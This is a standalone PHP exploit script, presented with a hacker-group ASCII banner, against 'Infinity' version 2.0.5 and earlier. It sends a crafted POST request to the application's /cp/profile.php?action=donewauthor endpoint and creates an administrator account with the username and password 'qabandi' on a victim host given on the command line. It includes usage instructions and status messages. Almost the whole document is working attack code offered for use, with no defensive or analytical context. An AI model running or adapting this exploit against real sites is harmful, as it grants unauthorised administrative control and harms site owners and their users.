          &lt;?php
print_r(&#039;
                                       ||          ||   | ||
                                o_,_7 _||  . _o_7 _|| q_|_||  o_///_,
                               (  :  /    (_)    /           (      .
 
                                        ___________________
                                      _/QQQQQQQQQQQQQQQQQQQ\__
[q] Infinity &lt;= 2.0.5 Create Admin __/QQQ/````````````````\QQQ\___
                                 _/QQQQQ/                  \QQQQQQ\
[q] _POST &lt;3                    /QQQQ/``                    ```QQQQ\
                               /QQQQ/                          \QQQQ\
[q] Owned :)                  |QQQQ/    By  Qabandi             \QQQQ|
                              |QQQQ|                            |QQQQ|
                              |QQQQ|    From Kuwait, PEACE...   |QQQQ|
                              |QQQQ|                            |QQQQ|
                              |QQQQ\       iqa[a]hotmail.fr     /QQQQ|
[/]   -[WHAT?]-                \QQQQ\                      __  /QQQQ/
                                \QQQQ\                    /QQ\_QQQQ/
                                 \QQQQ\                   \QQQQQQQ/
                                  \QQQQQ\                 /QQQQQ/_
                                   ``\QQQQQ\_____________/QQQ/\QQQQ\_
                                      ``\QQQQQQQQQQQQQQQQQQQ/  `\QQQQ\
                                         ```````````````````     `````
 ______________________________________________________________________________
/                                                                              \
|       :: Stupid vulnerability in a good script :( tsk tsk                    |
\______________________________________________________________________________/
                                \ No More Private /
                                 `````````````````
                                    Sec-Code.com
                                     
 
USAGE: php whatever.php localhost /infinity/
 
 
&#039;);
 
ini_set(&quot;max_execution_time&quot;,0);
 
 function QABANDI($victim,$vic_dir){
$host = $victim;
$p = &quot;http://&quot;.$host.$vic_dir;
 
 
 
 
          $data   =&quot;name=qabandi&amp;password=qabandi&amp;conf_password=qabandi&amp;email=Qabandi@was.here&amp;nat=man&amp;hoppy=QabandiWasHere&amp;text=QabandiWasHere&amp;country=1&quot;;
          $packet =&quot;POST &quot;.$p.&quot;/cp/profile.php?action=donewauthor HTTP/1.0\r\n&quot;;
          $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
          $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
          $packet.=&quot;Pragma: no-cache\r\n&quot;;
          $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
          $packet.=&quot;Connection: Close\r\n\r\n&quot;;
          $packet.=$data;
 
 
 
         //print $packet;
    $o = @fsockopen($host, 80);
    if(!$o){
        echo &quot;\n[x] No response...\n&quot;;
        die;
    }
     
    fputs($o, $packet);
    while (!feof($o)) $data .= fread($o, 1024);
    fclose($o);
     
    $_404 = strstr( $data, &quot;HTTP/1.1 404 Not Found&quot; );
    if ( !empty($_404) ){
        echo &quot;\n[x] 404 Not Found... Make sure of path. \n&quot;;
        die;
    }
     
        $_401 = strstr( $data, &quot;401 Authorization Required&quot; );
    if ( !empty($_401) ){
        echo &quot;\n[x] HTTP authentication detected! (mrakib jdar narry, maku faydeh) \n&quot;;
        die;
    }
                                           
                                           echo &quot;Admin created !\n\nUsername: qabandi\npassword: qabandi&quot;;
 
 }
 
$host1 = $argv[1];
$userdir1=$argv[2];
QABANDI($host1,$userdir1);
 
die;
 
 
?&gt;
